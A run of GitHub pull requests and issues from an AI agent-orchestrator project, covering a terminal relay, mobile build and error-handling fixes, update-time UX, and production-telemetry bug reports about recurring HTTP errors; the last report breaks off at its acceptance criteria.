title: feat(cloud): relay terminal traffic to workers
body:
## What

Implement the Docker-local version of the cloud terminal relay architecture.

Terminal traffic now uses a live relay path between the Electron client and the worker’s outbound terminal stream, while preserving an asynchronous durable mirror in the control plane/Postgres. The change also distinguishes an exited coding-agent terminal from a worker that is still provisioning.

## Why

The existing cloud terminal path made the control plane’s durable transport the synchronous data path for every keystroke and output frame. This added avoidable latency and made terminal responsiveness dependent on the queued transport path.

It also treated an exited agent terminal the same as a cold worker. The UI therefore retried indefinitely on an old/exited session and remained stuck on “Connecting…”.

## How

- Add a feature-flagged terminal relay fast path:
  - Electron → control-plane terminal relay → worker outbound stream → PTY → coding agent.
  - Worker output is delivered live to the connected browser, then mirrored asynchronously into Postgres for replay and audit.
  - Sequence numbers preserve byte ordering between live relay frames and durable replay.
  - Existing durable/Postgres transport remains as the fallback path.
- Add relay diagnostics for forwarded input, delivered output, and asynchronous mirroring.
- Add a stable terminal routing key to ticket responses for future affinity-aware deployment.
- Keep the relay embedded in the control-plane process for now. This validates the architecture locally without introducing a separate relay service or changing existing production routing.
- Return `410 TERMINAL_SESSION_EXITED` for an agent terminal that has already finished, rather than returning retryable worker-unavailable state.
- Stop the frontend retry loop for exited terminals and show a clear terminal error instead.
- Retain retry behavior for genuine cold-start/provisioning cases (`409 WORKER_UNAVAILABLE`).
- Add a short `agent.ready` grace period so sessions that already exited cannot wait forever for an event that will never arrive.

## Testing

Validated locally:

```bash
cd cloud
go test ./...
```

```bash
cd frontend
npm run typecheck
npx vitest run src/renderer/lib/cloud-terminal-mux.test.ts src/renderer/components/TerminalPane.test.tsx
```

Also verified manually with the Docker-local cloud stack:

```bash
AO_CLOUD_TERMINAL_STREAM=1 AO_CLOUD_TERMINAL_RELAY=1 npm run cloud:local
```

Then launch Electron against the local control plane:

```bash
cd frontend
AO_CLOUD_OFFERING=on \
AO_CLOUD_CONTROL_PLANE_URL=http://127.0.0.1:8081 \
npm run dev
```

Observed behavior:

- A live AI Skill Codex session successfully completed ticket issuance, terminal attach, ready state, input forwarding, live output delivery, and asynchronous durable mirroring.
- An exited Muza terminal returns `410` and stops retrying instead of staying on “Connecting…”.
- The Docker-local architecture is enabled only when both terminal stream and relay flags are set.

## Checklist

- [x] Branched from `main` (or continuing an existing PR branch)
- [x] One focused change; links the related issue when applicable
- [x] Follows [[AGENTS.md](https://github.com/AgentWrapper/agent-orchestrator/blob/main/AGENTS.md)](https://github.com/AgentWrapper/agent-orchestrator/blob/main/AGENTS.md) conventions and PR hygiene
- [x] Tests added/updated for user-visible behavior where it makes sense
- [x] Relevant CI checks pass for the area touched (`go`, frontend, etc.)
```

title: chore(mobile): build preview APKs for ARM only
body:
## Summary

The `preview` profile builds a universal APK with all four ABIs. This narrows it to the two its installs run, `armeabi-v7a` and `arm64-v8a`, without moving the OTA runtime version. That makes each APK about 49 MB (40.7%) smaller.

- **`production`** is unchanged: it builds an app bundle, and Play splits that per device.
- **`development`** is left as it is. It sets `developmentClient: true`, but this package does not depend on `expo-dev-client` (`packages/mobile/README.md`), so that profile does not produce a dev client today. Narrowing it can wait until it is buildable.

Closes #4879.

## How

`eas.json` sets `ORG_GRADLE_PROJECT_reactNativeArchitectures` under `preview.android.env`. Gradle reads `ORG_GRADLE_PROJECT_*` environment variables as project properties. React Native's plugin reads `reactNativeArchitectures` (`ProjectUtils.kt:102-110`) into `defaultConfig.ndk.abiFilters` (`NdkConfiguratorUtils.kt:58-62`), which filters every packaged `.so`, prebuilt ones included, unless ABI splits are enabled.

On the EAS side, eas-cli 22.6.0 reads `eas.json` from the project directory (`@expo/eas-json` `accessor.js:99`), merges the platform `env` over the profile's (`resolver.js:48-51`), and copies it into the job's builder environment (`build/android/prepareJob.js:58-60`).

This is neither of the two routes the issue proposed:

- **`expo-build-properties.buildArchs` in `app.json`** would move the runtime version. `fingerprint.config.js` ignores `eas.json` but not `app.json`, so that change would have to land at a native-release boundary.
- **A `gradleCommand`** means naming the Gradle task EAS would otherwise pick, and the eas.json reference documents it as a task, not a place for arguments. An environment variable applies to whichever task runs.

## After merge, on the publishing machine

`eas.json` is `skip-worktree` there, because it holds local App Store Connect submit credentials (README, "`eas.json` is `skip-worktree`"). Two consequences:

1. A `git pull` that includes this change aborts with "Your local changes … would be overwritten", and `git stash` reports nothing to save while the bit is set.
2. eas-cli builds the job environment from the on-disk file, so the local copy has to carry the new `env` block before the next `eas build --profile preview`.

Both are handled by merging the change into the local file:

```sh
git update-index --no-skip-worktree packages/mobile/eas.json
git stash && git pull && git stash pop   # local edits are in `submit`, this change is in `build`
git update-index --skip-worktree packages/mobile/eas.json
```

## Numbers

Local `assembleRelease` on the same prebuilt tree, three builds varying only the environment variable:

| Build | APK bytes | vs. all four | Native libraries |
|---|---|---|---|
| all four (today) | 121,309,407 | — | arm64-v8a 22,649,424 · armeabi-v7a 15,481,612 · x86 24,886,732 · x86_64 24,095,352 |
| without x86 | 96,207,418 | −25,101,989 (−20.7%) | the other three unchanged in size |
| **`preview` (this PR)** | **71,937,128** | **−49,372,279 (−40.7%)** | ARM only, both unchanged in size |

The libraries are stored uncompressed, so they cost install size as well as download.

## Verification

- **Runtime version unchanged.** `npx expo-updates runtimeversion:resolve` gives `android 8290ea0d05c8…` / `ios ad3999c715b0…` on `main`, with the `eas.json` change, and with the variable set in the environment.
- **The ARM-only APK runs.** Installed on an arm64-v8a emulator (API 36 image): `primaryCpuAbi=arm64-v8a`, `am start -W` reports 1,740 ms and the onboarding screen renders, and logcat shows no `UnsatisfiedLinkError` or `dlopen` failure from the app.
- No JS changes, so there is nothing for typecheck, vitest or `expo export` to see.

## Not verified

- **No EAS build.** I have no EAS access. The eas-cli path above was read in its source; that the EAS worker hands the builder environment to Gradle is from the eas.json reference, not observed. The numbers are from local builds.
- **No x86_64 emulator.** The only emulator image on this machine is arm64-v8a. On an x86_64 image, a `preview` APK now relies on ARM translation, which Google added to its Android 11 emulator images; where an image lacks it, install fails with `INSTALL_FAILED_NO_MATCHING_ABIS`. Keeping `x86_64` in `preview` would cost the 24.1 MB back.
- **No 32-bit ARM device.**

title: fix(mobile): ask the daemon about a session the board does not list
body:
## Summary

`app/session/[id].tsx` looked an id up in the board's two cached lists and, on a miss, refreshed those same lists and then said "Session not found." It never asked the daemon about the id itself.

Those lists do not hold every session. `getSessions` keeps one orchestrator per project (`bestByProject`: the first live one in session-number order, else the newest), so every other orchestrator is dropped, and a `needs_input` notification from one still routes to `/session/:id` (`notificationTarget`). The same screen also said "not found" when the refresh never reached the daemon.

Closes #4844.

## What changes

On a miss, the route asks `GET /sessions/{id}` and shows what the daemon said:

| State | Screen |
|---|---|
| no machine paired | the board's own "No desktop paired" state (checked before the lists, which still hold a forgotten machine's sessions) |
| listed on the board | the session, as before |
| found, terminated | This session has ended |
| found, live | the session, from the lookup |
| 404 / 410 | Session not found |
| board not connected, no answer yet | "Not connected to your desktop", with Open board |
| board connected, lookup failed | "Couldn't load this session", with Retry |

The rules are pure and tested in `lib/session/sessionRoute.ts`: `sessionRouteView` decides the screen and `sessionLookupDue` decides when to ask. `lookUpSession` (`lib/session/sessionLookup.ts`) is the request itself, and the route only wires them together.

**When it asks.** Only while the board's own poll holds an open connection to this machine. The store sets `open` only after a tick succeeds with the current password, and on a rejected one it leaves `closed` and stops polling. So a rotated password costs this screen no auth attempts: it never adds to the daemon's five-failure lockout, the trap `getSessions` probes `/sessions` first to avoid. A lookup that failed is asked again when the board reconnects. An answer the daemon gave (found, or 404/410) is never asked again. In the render where the paired machine changes, `connection` still describes the previous machine, because the store restarts its poll from an effect that runs after the route's. `machineChanged` skips that render.

**Not diagnosing the link twice.** While the board is disconnected the route sends nothing and points at the board. The board already tells a rotated tunnel from a rejected password from an unreachable machine (`tunnelMayHaveRotated`), and a second copy of that rule in the route would drift. #5349 rewrites the board, so extracting that logic into a shared helper now would conflict with it.

**Why an ended session is reported, not opened.** The session screens restore an ended session from their banner. A restored old orchestrator would be the first live one in session-number order. That is the one `bestByProject` keeps for the phone, and the one the daemon names as orchestrator in new workers' prompts (`activeOrchestratorSessionID` in `session_manager/manager.go`), so it would displace the orchestrator that replaced it.

**One extraction.** "404 or 410 means the session is gone" already existed as `interfaceTransitionSessionGone`. It moves to `connectionError.ts` as `isSessionGone`, so the route and the interface-transition scheduler read one rule. Its comment moved to the call site; the scheduler is unchanged.

`TerminalSessionScreen` takes the resolved session as a fallback for `known`, so a live unlisted TUI session gets its `terminalHandleId`. The board's lists still win whenever they hold the id.

## Verification

- `npx tsc --noEmit` clean. `npx expo export` bundles on ios and android.
- `npx vitest run`: **789 → 830** (+41).
- **Mutation checks**, each fails at least one test: the old rule (unlisted means not found) fails 18. Asking while `closed` fails 1. Dropping the machine-change guard fails 1. Checking the lists before the paired state fails 1. Showing a retry instead of "not connected" while the board is down fails 6. Mapping every request error to 404 fails 1.
- **Fixtures.** The orchestrator records are copied from a daemon built from `main` (`dc93038d1`): project `scratch` has two orchestrators, the first terminated. The `/sessions` mock is trimmed to those two, and the 404 body is the daemon's with its `requestId` renamed. The first test asserts the precondition, `board.orchestrators` is `["scratch-2"]`, before looking up `scratch-1`. The third uses a `TypeError("Network request failed")` rejection.
- **Simulator, iOS Debug build, dev daemon from `main`.** Navigation was driven through expo-router over the Hermes debugger. Request counts are from the daemon's HTTP log.

| Scenario | `main` | This PR |
|---|---|---|
| open replaced orchestrator `scratch-1` | "Session not found.", 0 requests for it | "This session has ended", 1 `GET` → 200 |
| open `no-such-session` | — | "Session not found", 1 `GET` → 404 |
| open listed `scratch-2` | chat screen | chat screen, 0 requests for it |
| board not connected, open `scratch-1` | — | "Not connected to your desktop", with Open board |

## Not verified

- **Request counts while the board is disconnected were not measured on device.** The rule ("never asks while the board is `closed` or `connecting`") is covered by the tests and mutation checks above. I could not reliably get a rejected password to reach the dev daemon from the simulator, so I did not count those requests.
- **No renderer in `packages/mobile`** (zero `*.test.tsx`), so the route's effect wiring is covered by the device rows above, not by a test.
- **A session opened from the lookup is not refreshed.** The board's poll refreshes listed sessions, but nothing re-fetches a looked-up one. The only live session that reaches this path is a second live orchestrator the board dropped, or one fetched moments before the board lists it. For that second orchestrator, a Chat/TUI switch or a kill is not reflected until the screen is reopened. Neither live-unlisted case, nor a TUI session through the `TerminalSessionScreen` fallback, was exercised on device.
- **Cold start from a notification tap** was reasoned through against `store.tsx` (`connection` starts `closed`, and `loading` is true until the first tick), not run.
- **The restore hazard above is read from the code:** I did not restore a replaced orchestrator.
- **Android** was checked by `expo export`, not run.

The fix for #4878 adds one line at the end of this route file. I test-applied both changes on `main` in each order: no conflict, identical result.

title: fix(mobile): show a fallback instead of terminating when a screen throws
body:
## Summary

No route in `packages/mobile` exports an `ErrorBoundary`, and expo-router only installs one where a route opts in, so a render-time throw on any screen terminates the app. This adds two fallbacks and installs them on every route that is only reached by navigating, except five that #5349 is changing:

- `RouteErrorBoundary`, for screens: **Try again**, plus **Go to board** when there is nothing to go back to.
- `SheetErrorBoundary`, for sheets: **Close** only.

Part of #4878: the five routes #5349 changes (below) still need the same line once it lands.

## Where a boundary must not go

The issue's constraint decides the placement. expo-updates takes a launch's first content as proof the launch worked: `ErrorRecovery.handleContentDidAppear` (`ErrorRecovery.swift:306`; Android `ErrorRecoveryHandler.kt:76`) marks the launched update successful and keeps only `waitForRemoteUpdate` and `crash` in its recovery pipeline, dropping `launchNew` and `launchCached`. A fallback rendered as that first content would record a broken over-the-air update as a good launch that can never roll back.

So the four routes that can render first content get none:

- `app/_layout.tsx`, `app/(tabs)/_layout.tsx` and `app/(tabs)/index.tsx`, which every normal launch renders.
- `app/pair.tsx`. The desktop's pairing QR is `aomobile://pair#…` (`ConnectMobileContent.tsx:148`), so scanning it with the system camera cold-starts the app straight into it.

Every other route is reached by navigating from content that has already appeared: `OnboardingGate` replaces to `/onboarding` from an effect, and `PushManager` navigates a cold-start notification tap only once navigation is ready. By then rollback is already off, so the choice is only between a fallback and a crash. A fixed update still arrives either way: `checkAutomatically` is `ON_LOAD`, and `UpdatesManager` checks again on a resume after `MIN_BACKGROUND_MS`.

**Residual exposure, stated rather than hidden:** expo-router maps every file route to an `aomobile://` URL. A hand-made link could cold-start straight into a covered route, and if that route threw on its first render, the fallback would be first content. Nothing AO produces links anywhere but `pair`; push payloads carry no URL and are routed after navigation is ready.

## Why two fallbacks

- **Sheets close instead of retrying.** A sheet's opener parks a callback that the route releases on unmount (`sheetResult.ts`; for example `useEffect(() => () => releaseSheetResult(resultKey), …)` in `sheets/model.tsx`). A throw unmounts the route, so an in-place retry would bring back a sheet whose choice goes nowhere. Opening it again parks a fresh one. One side effect to know about: `sheets/store-update.tsx` reports `dismiss` from that same cleanup, so a throw there counts as a dismissal.
- **Screens with nothing to go back to get Go to board.** `onboarding` is entered with `router.replace`, with no header and gestures off, so "go back" would name an action that does not exist. The fallback checks `router.canGoBack()`, the same rule as `MinimalBackButton`.

Both call `haptics.error()` each time they show, so a Try again that throws again is not a silent no-op. Both report through `captureMobileException` with `category: "render_crash"` and `operation: "react_render"`, the category and operation the desktop's boundary ends up with (`telemetry.ts:808` maps its `react-error-boundary` source to `render_crash`). That report is a no-op until the Sentry SDK is installed (`loadSdk()` returns `null`). The screen fallback also clears `headerRight`, because header options outlive the route in the navigator; preview's Reload button would otherwise stay over the fallback and act on nothing. A successful retry remounts the route, which sets its own header again.

## Routes

- **Screens:** `onboarding`, `session/[id]`, `shell/[handleId]`, `preview/[id]`.
- **Sheets:** all nine under `app/sheets/`.
- **Deferred:** `(tabs)/prs`, `(tabs)/orchestrator`, `(tabs)/settings`, `notifications` and `spawn`. #5349 deletes `(tabs)/orchestrator.tsx` and `(tabs)/settings.tsx` (Settings becomes `app/settings.tsx`) and changes `prs.tsx`, `notifications.tsx` and `spawn.tsx` through their last lines. It also adds `(tabs)/projects.tsx`, `project/[id].tsx`, `settings.tsx`, `sheets/conversation-actions.tsx` and `sheets/conversation-rename.tsx`.

`RouteErrorBoundary.test.ts` lists every file under `app/` and fails unless each one is on exactly one list: launch, screen, sheet or deferred. It also fails if a launch route mentions `Boundary`, `componentDidCatch` or `getDerivedStateFromError`, which catches a hand-written class boundary around the layout as well as expo-router's export and `screenErrorBoundary`. **For #5349:** once this is on `main`, that PR's five new routes fail this test until each is placed, and the deferred five should move to the screen list at the same time.

## Verification

- `npx tsc --noEmit` clean. `npx expo export` bundles on ios and android.
- `npx vitest run`: **789 → 807** (+18).
- **Mutation checks**, each fails one test: an unplaced new route under `app/sheets/`, a sheet given the retry fallback, and a `TelemetryBoundary` import added to `app/_layout.tsx`.
- **Simulator, iOS Debug build.** I added a temporary `throw` behind a global flag to `session/[id]` and `sheets/theme`, drove navigation over the Hermes debugger, and removed the throws afterwards. Buttons were pressed by calling their `onPress` through the React tree, since taps do not reach the simulator.

| Scenario | Result |
|---|---|
| throw on the pushed session screen | fallback, header back button intact; the component stack shows expo-router's `Try` above the route |
| flag cleared, Try again (run before the header and Go to board changes to the fallback) | the session's chat screen renders |
| throw in a sheet | "This sheet hit an unexpected error" on the sheet's surface; Close dismisses the sheet |
| throw on a session screen replaced into the stack (`canGoBack` false) | Try again and Go to board |

In a Debug build LogBox also shows the error over the fallback; each result above was read after dismissing it.

## Not verified

- **No Release build.** Try's only `__DEV__` branch lets a `MetroServerError` through to LogBox (`Try.js:45-53`), so a Release build should take the same path, but I did not run one.
- **Launch-time rollback was not exercised**, because none of the four launch routes changed, and the test fails if one ever gets a boundary.
- **Go to board was seen, not pressed**; onboarding's own fallback was not triggered (it needs an unpaired first launch). A throw after a sheet had mounted (data arriving later) was not triggered either; it takes the same Close path.
- **Android** was checked by `expo export`, not run. The haptic was not felt (simulator).

The fix for #4844 rewrites `app/session/[id].tsx`, where this adds one line at the end. I test-applied both changes on `main` in each order: no conflict, identical result.

title: fix(app): keep sidebar order stable on restart and keep the app visible during update
body:
Fixes two things users see on the desktop app.

## 1. Sidebar reordered itself after launch

On restart the backend re-hosts saved sessions and was stamping their `updated_at`/`last_activity_at` to "now" in worker-pool order. The sidebar sorts newest-updated first, so the list visibly reshuffled after first paint even though the user changed nothing.

This adds a lifecycle path (`MarkSpawnedRestored`) that preserves a re-hosted session's existing sort timestamps, and routes the restore relaunch through it. Genuine user actions still bump to "now" and still reorder. The renderer-side animation suppression that hides startup churn already landed on main; this is the root-cause backend fix that stops the reorder from happening at all.

## 2. Updating the app left it looking closed for up to a minute

There is no single 60s timeout. The gap is stacked waits, and the largest piece (the OS-level bundle/installer swap) is native to the updater and not reducible by us. What this PR fixes is that the app showed nothing during that window and the new backend was slow to come back:

- Instant paint: a static splash inside `index.html` removes the blank frame before React mounts, on every OS and on both cold and post-update launch.
- "Updating / Restarting AO" copy: a cross-platform post-update marker (`update-relaunch-flag`) lets the loader tell the user an update is in progress instead of a generic "connecting" (previously only macOS knew). New i18n strings across all locales.
- macOS helper: presents its window on the normal close/install path so the swap window is not blank.
- Backend boot trimmed: agent-readiness warming (~24 subprocess probes) is moved off the synchronous boot critical path into the post-ready callback, reducing contention with the port-gating work. Safety fences are untouched and still run before the port binds.

## 3. Boot robustness

Terminal handoff artifact cleanup on boot is made non-fatal (logs a warning instead of failing startup); it is best-effort maintenance, not a safety invariant.

## Verification

- Backend: `gofmt`/`build`/`vet` clean; `lifecycle`, `session_manager`, `daemon` suites pass. New tests cover timestamp preservation and non-fatal cleanup.
- Frontend: `typecheck` passes.
- Update timing across OSes is validated by reading the code paths and simulating the post-update marker, not by a live packaged update per OS (that needs a packaged build and a real release channel, which cannot be exercised from a dev checkout).

## Out of scope

Keeping the daemon alive across the update (removes the backend re-boot but touches supervisor lifecycle and SQLite single-owner guarantees) and reducing the native OS installer swap (not reducible by us).

title: bug(agents): login UI offers no API-key path for harnesses that accept one (kimi and others)
body:
## Problem

Harness settings > Kimi has one action: Login, which runs `kimi login` (browser authorize). A user with a Moonshot API key has no path to sign in from AO, and no guidance that the key route exists.

AO's own detector already accepts API-key auth for Kimi, so the login UI and the readiness check disagree about what counts as signed in.

## Evidence

- Auth plans hardcode one flow per harness. `backend/internal/service/agentauth/plans.go:20`: kimi is `plan("kimi", ActionLogin, ..., "Native browser flow")` running `kimi login`.
- The Kimi auth detector treats API keys as authorized: `backend/internal/adapters/agent/kimi/auth.go:31` accepts `KIMI_API_KEY`, `OPENAI_API_KEY`, `KIMI_CODE_API_KEY`, `MOONSHOT_API_KEY`, and `auth.go:193` accepts a non-empty `api_key` in `config.toml`.
- Result: the detector can report a user "authorized" through a config the login UI never helps them create.

## Repro

1. Settings > Harnesses > Kimi with no existing Kimi login.
2. Only button is Login. It opens the `kimi login` browser flow.
3. No API-key option or mention of one anywhere in the flow.

## Scope

Not kimi-only. `plans.go` gives every harness exactly one fixed flow. Same gap for harnesses whose detector honors an API key but whose plan offers only native login: grok (`XAI_API_KEY`), cursor (`CURSOR_API_KEY`), droid (`FACTORY_API_KEY`), cline (`CLINE_API_KEY`), kimchi (`KIMCHI_API_KEY`).

## Fix hint

Per-harness guidance naming the API-key path, using the `documentationPlan` pattern (`plans.go:48`) or enriched `Guidance`/`DocumentationURL`. A paste-key UI is a bigger change: clients never send credentials by design (`service.go:1`).

**Source:** Discord report-bugs thread, 2026-09-14, reported by .phylolver (vaibhaav)
**Analyzed against:** `9bbd9b9e1` (origin/main) · **Confidence:** High

title: perf(update): stop the app looking closed during update and restart
body:
Splits the update-latency and boot-robustness work out of #5355. The sidebar restart-order fix that #5355 also carried is dropped in favor of #5348, which fixes that root cause more completely.

## Problem

Updating the desktop app left it looking closed for up to a minute. There is no single 60s timeout: the gap is stacked waits, and the largest piece (the OS-level bundle/installer swap) is native to the updater and not reducible by us. The reducible parts are that the app showed nothing during that window and the new backend was slow to come back.

## Changes

- Instant paint: a static splash inside `index.html` removes the blank frame before React mounts, on every OS and on both cold and post-update launch.
- "Updating / Restarting AO" copy: a cross-platform post-update marker (`update-relaunch-flag`) lets the loader tell the user an update is in progress instead of a generic "connecting" (previously only macOS knew). New i18n strings across all locales.
- macOS helper: presents its window on the normal close/install path so the swap window is not blank.
- Backend boot trimmed: agent-readiness warming (~24 subprocess probes) is moved off the synchronous boot critical path into the post-ready callback, reducing contention with the port-gating work. Safety fences are untouched and still run before the port binds.
- Boot robustness: terminal handoff artifact cleanup on boot is made non-fatal (logs a warning instead of failing startup); it is best-effort maintenance, not a safety invariant.

## Verification

- Backend: build/vet clean; `session_manager` and `daemon` suites pass. New test covers the non-fatal cleanup.
- Frontend: `typecheck` passes.
- Update timing across OSes is validated by reading the code paths and simulating the post-update marker, not by a live packaged update per OS (that needs a packaged build and a real release channel, which cannot be exercised from a dev checkout).

## Out of scope

Keeping the daemon alive across the update (removes the backend re-boot but touches supervisor lifecycle and SQLite single-owner guarantees) and reducing the native OS installer swap (not reducible by us).

title: bug(chat): conversation skills polling returns repeated 409 conflicts
body:
## Summary

The desktop keeps requesting the conversation skills catalog while the chat controller is not ready. The daemon answers 409, the slash-command catalog stays unavailable, and the request is retried every minute for mounted Chat surfaces.

This is separate from #3720: that issue tracks provider-side `skills/list` failures that return 500. This report tracks the much broader 409 state/readiness conflict.

## User impact

- Typing `/` may not offer the session's available skills.
- The failure is silent in the composer, so users cannot tell whether the session has no skills or the catalog failed to load.
- Mounted Chat surfaces continue generating failed requests instead of waiting for a usable controller state.

**Priority: P1** — the signal affected 1,198 installations in 28 days and remained steady through the final week.

## Steps to reproduce

The production telemetry does not include session IDs or controller state, so the exact transition sequence still needs to be isolated.

1. Open a Chat session while its controller is starting, restarting, or changing agents/interfaces.
2. Keep the Chat surface mounted.
3. Observe `GET /api/v1/sessions/<id>/conversation/skills` in DevTools.
4. The request returns 409 and repeats on the catalog's one-minute refresh interval.
5. Type `/`; no skills catalog is available and no retryable error is shown.

## Expected behavior

- The renderer should enable catalog polling only after the live controller owns the session, and stop or back off when that prerequisite disappears.
- A temporary catalog failure should be distinguishable from a legitimate empty catalog.
- Telemetry should record the stable API error code so readiness conflicts can be separated from other 409s.

## Agent-collected evidence

Source: PostHog production telemetry, read-only query, 2026-08-17 through 2026-09-13 UTC. No human-authored report is asserted.

- 1,198 distinct installations
- 23,254 renderer API-error events
- `error_category=http_4xx`, HTTP 409
- `error_code` is missing on every matching event
- 2026-09-07 through 2026-09-13: 9,349 events; 105–126 affected installations per weekday
- Events per affected installation stayed between 11.0 and 16.5 during the final week, so the weekend volume drop does not indicate a fix.

Verification query and result thread: https://us.posthog.com/project/475752/ai?chat=902abde9-71a2-4c51-a4fc-7159248da017

## Relevant code

- `frontend/src/renderer/hooks/useConversation.ts`: `useConversationSkills` polls every 60 seconds with no retry, but a mounted query continues to refetch.
- `frontend/src/renderer/components/chat/SessionChatSurface.tsx`: the catalog is gated by the renderer's controller-readiness view.
- `backend/internal/httpd/controllers/conversations.go`: `ErrNoController` maps to 409 `CHAT_CONTROLLER_NOT_READY`.

## Acceptance criteria

- A regression test covers a controller becoming unavailable before and after the skills query is enabled.
- The renderer does not repeatedly request skills while the controller is unavailable or transitioning.
- A temporary failure produces a retryable/degraded composer state instead of looking identical to “no skills installed.”
- Renderer telemetry includes the API error code for this route.
- PostHog shows the 409 rate per affected installation falling materially after rollout.

## Related

- #3720 — same endpoint, different 500/provider failure.
- #4842 — a different interface-transition readiness mismatch involving `NATIVE_SESSION_MISSING`; not a duplicate.

title: bug(workspace): workspace file listing returns recurring 500 and 503 responses
body:
## Summary

The Workspace Files endpoint is returning 500/503 responses in production, preventing the right-side Files inspector and `@` file completion from loading the workspace file list.

This is separate from #5363. That issue tracks the diff pane staying on `Loading diff...` after the backing API succeeds; this report tracks the file-list API itself failing.

## User impact

- The Files inspector cannot show the session's files.
- `@` file completion can be empty or unavailable.
- Users lose the primary in-app path for checking what an agent changed.

**Priority: P1** — the 28-day signal affected 420 installations, and 500s increased again on September 12–13.

## Steps to reproduce

The aggregate telemetry does not retain the underlying server error, so the exact repository condition still needs to be isolated.

1. Open a session with a workspace containing tracked or untracked files.
2. Open **Files** in the right inspector, or type `@` in Chat.
3. Observe `GET /api/v1/sessions/<id>/workspace/files`.
4. The daemon returns 500 or 503; the file list cannot be used.

## Expected behavior

- A valid session workspace returns a bounded file list.
- Temporary daemon unavailability has a clear retry state and bounded backoff.
- Repository-specific failures are returned with typed, actionable error codes rather than a generic 500.

## Agent-collected evidence

Source: PostHog production telemetry, read-only query, 2026-08-17 through 2026-09-13 UTC. No human-authored report is asserted.

- 420 distinct installations and 3,840 HTTP 500 events over the full 28-day window.
- September 12–13: 28 installations / 260 HTTP 500 events, plus 14 installations / 76 HTTP 503 events.
- Daily HTTP 500 volume rose from 43–90 events on September 7–11 to 145 on September 12 and 115 on September 13.
- The 500 increase occurred without a comparable increase in affected-install count, so it is not explained only by more users.

Verification query and result thread: https://us.posthog.com/project/475752/ai?chat=902abde9-71a2-4c51-a4fc-7159248da017

## Diagnostic gap

PostHog retains the normalized route and status but not the daemon error code or Sentry fingerprint. Add the typed error code to the renderer event, and correlate the server request ID with Sentry once organization access is restored.

## Acceptance criteria

- Reproduce and classify the dominant 500 fingerprint using request IDs/Sentry.
- File listing returns typed errors for missing/invalid workspace states.
- The Files inspector and `@` completion show a retryable state for temporary failures.
- Retry behavior is bounded and does not amplify one failure into continuous telemetry noise.
- Add integration coverage for the confirmed repository/workspace condition.
- Verify a sustained drop in 500 events per affected installation after rollout.

## Related

- #5363 — successful API response but the diff UI never settles; not a duplicate.
- #4325 — generic historical untyped-500 cleanup; does not track this production regression.

title: bug(browser): browser commands continue returning 500 and 503 responses
body:
## Summary

Browser commands are still returning 500/503 responses in production. The recent pattern is dominated by 503s, so agents can lose the built-in Browser tool even while the rest of a session remains usable.

PR #5241 fixed missing cancellation results and PR #5312 is bounding profile-operation waits. Neither tracks the remaining production 5xx rate or identifies its current fingerprints.

## User impact

- An agent's browser action fails or times out.
- Users cannot reliably test web UI, inspect a page, or complete browser-assisted tasks inside AO.
- A 503 offers no useful recovery path in the desktop UI.

**Priority: P1** — failures continued after the cancellation fix merged, including 199 HTTP 503 events across 34 installations on September 12–13.

## Steps to reproduce

The aggregate telemetry does not identify the command type or runtime error, so this is initially an investigation/reliability issue.

1. Start a session with the desktop Browser feature available.
2. Ask the agent to open, inspect, or interact with a page.
3. Observe `POST /api/v1/browser/commands`.
4. The request returns 500 or 503 and the browser action does not complete.

Include reconnect/dispose, profile clear/delete, first command after app start, and concurrent commands in the reproduction matrix.

## Expected behavior

- Accepted browser commands complete with a result or a typed, bounded cancellation/timeout.
- Temporary runtime unavailability is surfaced with a clear retry path.
- Telemetry identifies command type and stable error code without recording URLs or page content.

## Agent-collected evidence

Source: PostHog production telemetry, read-only query, 2026-08-17 through 2026-09-13 UTC. No human-authored report is asserted.

- Full window: 259 installations / 3,661 HTTP 500 events; 136 installations / 2,241 HTTP 503 events. Installation sets can overlap and are not summed.
- September 9: 25 installations / 515 HTTP 503 events.
- September 10: 24 installations / 730 HTTP 503 events.
- September 12–13, after PR #5241 merged: 17 installations / 27 HTTP 500 events and 34 installations / 199 HTTP 503 events.
- The 500 rate fell sharply by September 12–13, but 503s remained material and rose again on September 13.

Verification query and result thread: https://us.posthog.com/project/475752/ai?chat=902abde9-71a2-4c51-a4fc-7159248da017

## Diagnostic gap

The current event records route/status but not browser command kind, stable error code, desktop version, or runtime-link state. Add privacy-safe dimensions needed to separate disconnects, profile-operation waits, runtime absence, and command execution failures.

## Acceptance criteria

- Identify the top current 500 and 503 fingerprints using request IDs/Sentry.
- Record command kind, stable error code, app version, and coarse runtime-link state in privacy-safe telemetry.
- Every accepted command returns success or a typed bounded failure.
- The desktop shows a useful retry/reconnect action for runtime-unavailable failures.
- Regression tests cover reconnect/dispose, stuck profile work, startup readiness, and queued commands.
- Confirm the 5xx rate per browser-command installation falls after rollout.

## Related

- PR #5241 — merged cancellation-result fix.
- PR #5312 — open profile-operation timeout fix.

title: bug(session): message send endpoint returns recurring 500 responses
body:
## Summary

Sending a message to a session is returning recurring HTTP 500 responses in production. The request fails before AO can confirm that the message reached the agent, and the telemetry does not record an error code that would identify the cause.

This report covers `POST /api/v1/sessions/{sessionId}/send`. It is separate from the Chat conversation message endpoint.

## User impact

- A follow-up typed in the desktop, sent from the CLI, or generated by an inspector action may fail.
- The user cannot tell whether the message was rejected or might still reach the agent.
- Retrying can risk duplicate instructions if the original outcome is unclear.

**Priority: P1** because the signal affected 273 installations in 28 days and continued through every day of the final week.

## Steps to reproduce

The aggregate telemetry does not retain the daemon error or session state, so the exact failing condition still needs to be isolated.

1. Start a TUI session.
2. Send a follow-up through the desktop or run `ao send <session> <message>`.
3. Observe `POST /api/v1/sessions/<id>/send`.
4. In the affected state, the daemon returns HTTP 500 and AO cannot confirm delivery.

The investigation should include sessions whose runtime is starting, stopped, missing, or being restored, plus concurrent and attachment-bearing sends.

## Expected behavior

- A valid running session accepts the message and confirms delivery.
- A session that cannot accept input returns a typed, actionable error.
- An uncertain delivery result is distinct from a definite rejection so the client can offer a safe recovery action.

## Agent-collected evidence

Source: PostHog production telemetry, read-only query, 2026-08-17 through 2026-09-13 UTC. No human-authored report or successful local reproduction is asserted.

- HTTP 500: 273 distinct installations and 1,870 events.
- HTTP 503: 4 distinct installations and 4 events.
- The final seven days continued to show the failure across 14 to 24 installations per day.
- Daily HTTP 5xx counts for September 7 through 13 were 56, 170, 85, 51, 63, 139, and 72.
- `error_code` is missing on every matching event.

Verification query and result thread: https://us.posthog.com/project/475752/ai?chat=902abde9-71a2-4c51-a4fc-7159248da017

## Diagnostic gap

PostHog records the normalized route and status but not the daemon error code, request ID, session mode, runtime state, or whether delivery may have occurred. Add privacy-safe fields that let the team separate missing runtimes, startup races, storage failures, and transport failures.

## Acceptance criteria

